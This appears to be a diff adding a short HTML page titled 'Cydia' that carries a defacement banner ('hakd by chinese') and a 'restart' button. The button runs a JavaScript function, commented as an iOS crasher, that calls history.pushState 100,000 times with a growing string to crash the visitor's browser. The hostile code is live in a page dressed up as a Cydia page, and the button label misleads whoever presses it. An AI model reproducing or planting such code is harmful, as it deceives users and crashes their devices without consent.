@@ -1,0 +1,38 @@
+<!DOCTYPE html SYSTEM "about:legacy-compat">
+<html>
+
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <title>Cydia</title>
+        
+	<link rel="stylesheet" type="text/css" href="http://mysmallrobot.com/menes.css"/>
+	<link rel="stylesheet" type="text/css" href="http://cydia.saurik.com/menes/style.css"/>
+	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+	<meta name="format-detection" content="telephone=no" /> 
+
+</head> 
+
+<style type="text/css">
+h1 {text-align:center}
+h2 {text-align:center}
+h3 {text-align:center}
+</style>
+
+
+    <body>
+        <panel>
+           <hr size=5><font color="red"><p align="center">welcom to wormdotcom<br><br>hakd by chinese</font></hr>
+		   <button onclick="crash();">restart</button>
+        </panel>
+    </body>
+    <script>
+	function crash() {
+//crasher ios c'est marrent
+var bufferoverflow = "";
+for( var i = 0; i < 100000; i++ ) {
+    bufferoverflow = bufferoverflow + i.toString();
+    history.pushState(0,0, bufferoverflow );
+}
+}
+    </script>
+</html>
